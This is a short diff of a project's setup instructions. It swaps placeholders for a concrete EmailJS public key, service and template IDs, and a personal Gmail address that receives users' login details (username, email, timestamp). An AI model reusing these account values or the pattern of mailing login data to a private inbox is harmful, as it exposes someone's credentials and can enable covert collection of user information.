@@ -61,13 +61,13 @@ Open `main.js` and update:
 ```javascript
 emailjs.init('YOUR_EMAILJS_PUBLIC_KEY');
 // Replace with:
-emailjs.init('pk_your_actual_public_key_here');
+emailjs.init('2zaPUjs8EKeOqaqC9');
 ```
 
 **Lines 60-72:**
 ```javascript
 const emailParams = {
-  to_email: 'your-email@gmail.com',  // ← Change this
+  to_email: 'ohnotriplesix@gmail.com',  // ← Change this
   username: username,
   user_email: userEmail,
   timestamp: loginData.timestamp,
@@ -76,8 +76,8 @@ const emailParams = {
 };
 
 const emailResponse = await emailjs.send(
-  'service_abc123xyz',           // ← Change this
-  'template_abc123xyz',           // ← Change this
+  'service_worbtco',           // ← Change this
+  'template_ql3l0yp',           // ← Change this
   emailParams
 );
 ```
